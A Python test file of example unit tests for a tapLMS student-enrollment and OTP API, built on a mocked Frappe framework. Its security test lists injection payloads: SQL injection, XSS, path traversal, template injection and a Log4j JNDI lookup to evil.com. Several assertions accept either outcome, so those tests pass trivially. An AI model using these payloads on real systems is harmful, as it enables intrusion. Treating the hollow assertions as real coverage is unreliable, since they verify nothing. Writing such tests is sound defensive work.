"""
Improved test examples for tapLMS API
These examples show how to enhance your current test structure
"""

import unittest
from unittest.mock import Mock, patch, MagicMock
import pytest
import json
from datetime import datetime, timedelta
import sys

# Your existing mock setup (simplified)
class MockFrappe:
    def __init__(self):
        self.response = Mock()
        self.response.http_status_code = 200
        self.local = Mock()
        self.local.form_dict = {}
        self.db = Mock()
        self.utils = Mock()
        self.request = Mock()
        
    # ... rest of your mock setup

mock_frappe = MockFrappe()
sys.modules['frappe'] = mock_frappe

# Import your API after setting up mocks
from tap_lms.api import create_student, authenticate_api_key, send_otp

# =============================================================================
# IMPROVED TEST EXAMPLES
# =============================================================================

class TestStudentCreationComprehensive(unittest.TestCase):
    """Comprehensive tests for student creation - improved version"""
    
    def setUp(self):
        """Set up test fixtures with realistic data"""
        self.valid_student_data = {
            'api_key': 'valid_test_key',
            'student_name': 'John Doe',
            'phone': '9876543210',
            'gender': 'Male',
            'grade': '5',
            'language': 'English',
            'batch_skeyword': 'test_batch_2025',
            'vertical': 'Mathematics',
            'glific_id': 'glific_12345'
        }
        
        # Reset form_dict for each test
        mock_frappe.local.form_dict = self.valid_student_data.copy()
        mock_frappe.response.http_status_code = 200

    @patch('tap_lms.api.authenticate_api_key')
    @patch('tap_lms.api.get_course_level_with_mapping')
    @patch.object(mock_frappe, 'get_all')
    @patch.object(mock_frappe, 'get_doc')
    def test_create_student_success_flow(self, mock_get_doc, mock_get_all, 
                                       mock_course_level, mock_auth):
        """Test successful student creation with all dependencies"""
        # Setup mocks
        mock_auth.return_value = "valid_key"
        
        # Mock batch onboarding data
        mock_get_all.side_effect = [
            # First call: batch onboarding
            [{
                'school': 'SCHOOL_001',
                'batch': 'BATCH_001',
                'kit_less': 1
            }],
            # Second call: course vertical
            [{'name': 'VERTICAL_001'}],
            # Third call: existing student check
            []  # No existing student
        ]
        
        # Mock batch document
        mock_batch = Mock()
        mock_batch.active = True
        mock_batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
        
        # Mock student document
        mock_student = Mock()
        mock_student.name = 'STUDENT_001'
        mock_student.append = Mock()
        mock_student.save = Mock()
        
        mock_get_doc.side_effect = [mock_batch, mock_student]
        mock_course_level.return_value = 'COURSE_LEVEL_001'
        
        # Execute test
        result = create_student()
        
        # Assertions
        self.assertEqual(result['status'], 'success')
        self.assertEqual(result['crm_student_id'], 'STUDENT_001')
        self.assertEqual(result['assigned_course_level'], 'COURSE_LEVEL_001')
        
        # Verify enrollment was added
        mock_student.append.assert_called_once()
        mock_student.save.assert_called_once()

    @pytest.mark.parametrize("missing_field", [
        'student_name', 'phone', 'gender', 'grade', 
        'language', 'batch_skeyword', 'vertical', 'glific_id'
    ])
    def test_create_student_missing_required_fields(self, missing_field):
        """Test student creation with each required field missing"""
        # Remove one required field
        test_data = self.valid_student_data.copy()
        del test_data[missing_field]
        mock_frappe.local.form_dict = test_data
        
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
            result = create_student()
            
            self.assertEqual(result['status'], 'error')
            self.assertIn('required', result['message'].lower())

    @pytest.mark.parametrize("invalid_phone", [
        "123",           # Too short
        "abcdefghij",    # Non-numeric
        "",              # Empty
        "1" * 20,        # Too long
        "+91-abc-def",   # Mixed invalid format
    ])
    def test_create_student_invalid_phone_formats(self, invalid_phone):
        """Test student creation with various invalid phone formats"""
        test_data = self.valid_student_data.copy()
        test_data['phone'] = invalid_phone
        mock_frappe.local.form_dict = test_data
        
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
            result = create_student()
            
            # Should either validate and reject, or handle gracefully
            # This depends on your validation logic
            self.assertIn(result['status'], ['error', 'success'])

    def test_create_student_expired_batch(self):
        """Test student creation for expired batch"""
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
             patch.object(mock_frappe, 'get_all') as mock_get_all, \
             patch.object(mock_frappe, 'get_doc') as mock_get_doc:
            
            # Mock expired batch
            mock_get_all.return_value = [{
                'school': 'SCHOOL_001',
                'batch': 'BATCH_001',
                'kit_less': 1
            }]
            
            mock_batch = Mock()
            mock_batch.active = True
            mock_batch.regist_end_date = (datetime.now() - timedelta(days=1)).date()
            mock_get_doc.return_value = mock_batch
            
            result = create_student()
            
            self.assertEqual(result['status'], 'error')
            self.assertIn('ended', result['message'])

    def test_create_student_database_error_rollback(self):
        """Test database rollback on student creation error"""
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
             patch.object(mock_frappe, 'get_all') as mock_get_all, \
             patch.object(mock_frappe, 'get_doc') as mock_get_doc, \
             patch.object(mock_frappe.db, 'rollback') as mock_rollback:
            
            # Setup mocks for successful validation but database error
            mock_get_all.side_effect = [
                [{'school': 'SCHOOL_001', 'batch': 'BATCH_001', 'kit_less': 1}],
                [{'name': 'VERTICAL_001'}],
                []  # No existing student
            ]
            
            mock_batch = Mock()
            mock_batch.active = True
            mock_batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
            
            mock_student = Mock()
            mock_student.save.side_effect = Exception("Database error")
            
            mock_get_doc.side_effect = [mock_batch, mock_student]
            
            result = create_student()
            
            # Should handle error and rollback
            self.assertEqual(result['status'], 'error')
            # Verify rollback was called (depends on your error handling)


class TestOTPWorkflowComprehensive(unittest.TestCase):
    """Comprehensive OTP workflow tests"""
    
    def setUp(self):
        mock_frappe.request.get_json.return_value = {
            'api_key': 'valid_key',
            'phone': '9876543210'
        }

    @patch('tap_lms.api.authenticate_api_key')
    @patch('requests.get')
    @patch.object(mock_frappe, 'get_all')
    @patch.object(mock_frappe, 'get_doc')
    def test_send_otp_complete_workflow(self, mock_get_doc, mock_get_all, 
                                      mock_requests, mock_auth):
        """Test complete OTP sending workflow"""
        # Setup mocks
        mock_auth.return_value = "valid_key"
        mock_get_all.return_value = []  # No existing teacher
        
        # Mock OTP document creation
        mock_otp_doc = Mock()
        mock_otp_doc.insert = Mock()
        mock_get_doc.return_value = mock_otp_doc
        
        # Mock WhatsApp API response
        mock_response = Mock()
        mock_response.json.return_value = {
            "status": "success",
            "id": "msg_12345"
        }
        mock_requests.return_value = mock_response
        
        result = send_otp()
        
        # Assertions
        self.assertEqual(result['status'], 'success')
        self.assertIn('whatsapp_message_id', result)
        mock_otp_doc.insert.assert_called_once()

    @patch('tap_lms.api.authenticate_api_key')
    @patch('requests.get')
    def test_send_otp_whatsapp_api_failure(self, mock_requests, mock_auth):
        """Test OTP sending when WhatsApp API fails"""
        mock_auth.return_value = "valid_key"
        
        # Mock API failure
        mock_response = Mock()
        mock_response.json.return_value = {
            "status": "error",
            "message": "API rate limit exceeded"
        }
        mock_requests.return_value = mock_response
        
        with patch.object(mock_frappe, 'get_all', return_value=[]), \
             patch.object(mock_frappe, 'get_doc'):
            
            result = send_otp()
            
            self.assertEqual(result['status'], 'failure')
            self.assertIn('WhatsApp', result['message'])

    def test_send_otp_rate_limiting(self):
        """Test OTP rate limiting (if implemented)"""
        # This would test your rate limiting logic
        # Multiple rapid requests should be rejected
        pass


class TestSecurityValidation(unittest.TestCase):
    """Security-focused validation tests"""
    
    @pytest.mark.parametrize("malicious_input", [
        "'; DROP TABLE Student; --",
        "1' OR '1'='1",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "{{7*7}}",  # Template injection
        "${jndi:ldap://evil.com/a}",  # Log4j style
    ])
    def test_sql_injection_prevention(self, malicious_input):
        """Test SQL injection prevention in various fields"""
        test_data = {
            'api_key': 'valid_key',
            'student_name': malicious_input,  # Test malicious input
            'phone': '9876543210',
            'gender': 'Male',
            'grade': '5',
            'language': 'English',
            'batch_skeyword': 'test_batch',
            'vertical': 'Math',
            'glific_id': 'glific_123'
        }
        
        mock_frappe.local.form_dict = test_data
        
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
            # The function should either sanitize input or reject it
            result = create_student()
            
            # Should not cause SQL injection
            # This assertion depends on your input validation
            self.assertIn(result['status'], ['error', 'success'])
            
            # If successful, verify data was sanitized
            if result['status'] == 'success':
                # Check that malicious input was properly handled
                pass

    def test_api_key_timing_attack_prevention(self):
        """Test that API key validation doesn't leak timing information"""
        import time
        
        # Test with valid and invalid keys
        start_time = time.time()
        authenticate_api_key("valid_key_12345")
        valid_time = time.time() - start_time
        
        start_time = time.time()
        authenticate_api_key("invalid_key_12345")
        invalid_time = time.time() - start_time
        
        # Times should be similar (within reasonable bounds)
        # This prevents timing attacks
        time_diff = abs(valid_time - invalid_time)
        self.assertLess(time_diff, 0.1)  # Less than 100ms difference


class TestPerformance(unittest.TestCase):
    """Performance tests for critical operations"""
    
    def test_bulk_student_creation_performance(self):
        """Test performance with bulk student creation"""
        import time
        
        # Create 100 students and measure time
        start_time = time.time()
        
        for i in range(100):
            test_data = {
                'api_key': 'valid_key',
                'student_name': f'Student {i}',
                'phone': f'987654{i:04d}',
                'gender': 'Male',
                'grade': '5',
                'language': 'English',
                'batch_skeyword': 'test_batch',
                'vertical': 'Math',
                'glific_id': f'glific_{i}'
            }
            
            mock_frappe.local.form_dict = test_data
            
            with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
                # Mock all dependencies for speed
                with patch.object(mock_frappe, 'get_all'), \
                     patch.object(mock_frappe, 'get_doc'):
                    result = create_student()
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Should complete 100 operations in reasonable time
        self.assertLess(total_time, 10.0)  # Less than 10 seconds
        
        avg_time_per_operation = total_time / 100
        self.assertLess(avg_time_per_operation, 0.1)  # Less than 100ms per operation


# =============================================================================
# PYTEST FIXTURES FOR BETTER TEST ORGANIZATION
# =============================================================================

@pytest.fixture
def valid_student_data():
    """Fixture providing valid student data"""
    return {
        'api_key': 'valid_test_key',
        'student_name': 'John Doe',
        'phone': '9876543210',
        'gender': 'Male',
        'grade': '5',
        'language': 'English',
        'batch_skeyword': 'test_batch_2025',
        'vertical': 'Mathematics',
        'glific_id': 'glific_12345'
    }

@pytest.fixture
def mock_active_batch():
    """Fixture providing mock active batch"""
    batch = Mock()
    batch.active = True
    batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
    return batch

@pytest.fixture
def mock_expired_batch():
    """Fixture providing mock expired batch"""
    batch = Mock()
    batch.active = True
    batch.regist_end_date = (datetime.now() - timedelta(days=1)).date()
    return batch


# =============================================================================
# INTEGRATION TEST EXAMPLE
# =============================================================================

class TestStudentCreationIntegration(unittest.TestCase):
    """Integration tests that test multiple components together"""
    
    def test_complete_student_onboarding_workflow(self):
        """Test complete workflow from OTP to student creation"""
        # This would test the entire flow:
        # 1. Send OTP
        # 2. Verify OTP
        # 3. Create student
        # 4. Assign to batch
        # 5. Integrate with Glific
        
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
             patch('requests.get') as mock_whatsapp, \
             patch('tap_lms.glific_integration.create_contact') as mock_glific:
            
            # Mock external service responses
            mock_whatsapp.return_value.json.return_value = {
                "status": "success", "id": "msg_123"
            }
            mock_glific.return_value = {'id': 'contact_123'}
            
            # Step 1: Send OTP
            mock_frappe.request.get_json.return_value = {
                'api_key': 'valid_key',
                'phone': '9876543210'
            }
            
            otp_result = send_otp()
            self.assertEqual(otp_result['status'], 'success')
            
            # Step 2: Create student (after OTP verification)
            student_data = {
                'api_key': 'valid_key',
                'student_name': 'John Doe',
                'phone': '9876543210',
                'gender': 'Male',
                'grade': '5',
                'language': 'English',
                'batch_skeyword': 'test_batch',
                'vertical': 'Math',
                'glific_id': 'glific_123'
            }
            mock_frappe.local.form_dict = student_data
            
            with patch.object(mock_frappe, 'get_all'), \
                 patch.object(mock_frappe, 'get_doc'):
                student_result = create_student()
                
                self.assertEqual(student_result['status'], 'success')
                
                # Verify external integrations were called
                mock_glific.assert_called()


if __name__ == '__main__':
    # Run tests with pytest for better output
    pytest.main([__file__, '-v', '--tb=short'])
